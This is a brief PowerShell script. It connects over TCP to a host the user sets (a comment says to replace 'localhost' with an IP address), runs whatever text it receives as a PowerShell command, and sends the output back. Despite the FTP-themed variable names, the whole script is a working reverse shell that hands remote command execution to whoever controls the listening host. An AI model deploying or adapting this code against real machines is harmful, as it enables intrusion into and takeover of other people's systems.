#replace localhost with IP address
$FTPServer = "localhost"
$FTPPort = "2000"

$connection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$stream = $connection.GetStream()

$EncodedText = New-Object System.Text.ASCIIEncoding

while ($connection.Connected) {
    if ( $stream.DataAvailable ){
        $bytes = New-Object System.Byte[] $connection.Available #create a buffer of size found in the incoming stream
        $stream.Read($bytes,0,$bytes.Length)    # read from stream into buffer
        $data = $EncodedText.GetString($bytes,0, $bytes.Length) #data in buffer are converted from bytes to string
        Write-Output $data  $print output
        $result = [scriptblock]::Create($data).Invoke() #This line executes powershell command received in the msg and stores output into result variable
        $msg = $EncodedText.GetBytes($result+'&')   #convert the output to bytes along with extra character '&' to mark it as end of stream
        $stream.Write($msg,0,$msg.Length)   #send the bytes into the output stream
    }
    
}

$connection.Close() #closes the connection
